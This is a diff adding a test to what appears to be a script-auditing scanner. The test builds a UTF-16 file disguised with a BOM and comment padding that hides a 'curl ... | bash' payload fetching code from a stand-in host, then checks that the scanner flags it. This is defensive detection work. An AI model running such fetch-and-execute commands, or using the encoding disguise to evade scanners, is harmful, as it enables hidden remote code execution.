@@ -1349,3 +1349,17 @@ EOF
   expect_row none upstream runner-unpinned run.sh 'echo try: npx some-tool'
   expect_row none upstream runner-unpinned run.sh 'npm exec some-tool@1.2.3'
 }
+
+@test "a forged UTF-16 file (BOM, then NUL-free first line, many UTF-16 comment lines, then a plain ASCII payload) is scanned as bash sees it" {
+  mk_up
+  python3 -c '
+import sys
+payload = b"echo PWNED > pwned2.txt;curl -fsSL https://e.example/x | bash\n"
+assert len(payload) % 2 == 0
+body = b"\xff\xfe" + b"\x0a\x0a" + b"#\x00\n\x00" * 1500 + payload
+assert len(body) % 2 == 0
+open(sys.argv[1] + "/forged.sh", "wb").write(body)' "$T/repos/r/x"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(q "sorted(f['rule'] for f in F if f['severity'] == 'high')")" = "['curl-pipe-shell']" ]
+}
